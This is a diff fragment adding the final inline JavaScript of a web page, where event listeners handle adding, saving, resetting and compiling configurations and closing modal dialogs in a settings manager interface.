+        document.getElementById('confirmAddConfig')?.addEventListener('click', () => { const name = document.getElementById('newConfigName').value.trim(); if(addNewConfig(name)) { document.getElementById('addConfigModal').classList.remove('show'); document.getElementById('newConfigName').value = ''; showToast('Config added','success');} else showToast('Invalid name','warning'); });
+        document.getElementById('cancelAddConfig')?.addEventListener('click', () => document.getElementById('addConfigModal').classList.remove('show'));
+        document.getElementById('saveConfigChangesBtn')?.addEventListener('click', () => { if(saveCurrentSettings()) { document.getElementById('editConfigModal').classList.remove('show'); showToast('Config saved','success'); } });
+        document.getElementById('restoreDefaultSettingsBtn')?.addEventListener('click', () => { if(editingIndex !== -1) { configsList[editingIndex].settings = getDefaultSettings(); openEditModal(editingIndex); showToast('Defaults restored','info'); } });
+        document.getElementById('compileAndDownloadBtn')?.addEventListener('click', async () => { await compileAndDownload(); document.getElementById('editConfigModal').classList.remove('show'); });
+        document.getElementById('closeEditModalBtn')?.addEventListener('click', () => document.getElementById('editConfigModal').classList.remove('show'));
+        document.getElementById('closeInstructionsModal')?.addEventListener('click', () => document.getElementById('compileInstructionsModal').classList.remove('show'));
+        document.querySelectorAll('.nav-tab').forEach(tab => tab.addEventListener('click', () => switchTab(tab.dataset.tab)));
+        document.querySelectorAll('.modal-close').forEach(btn => btn.addEventListener('click', (e) => { const modalId = btn.getAttribute('data-modal'); if(modalId) document.getElementById(modalId).classList.remove('show'); else btn.closest('.modal').classList.remove('show'); }));
+    })();
+</script>
+</body>
+</html>
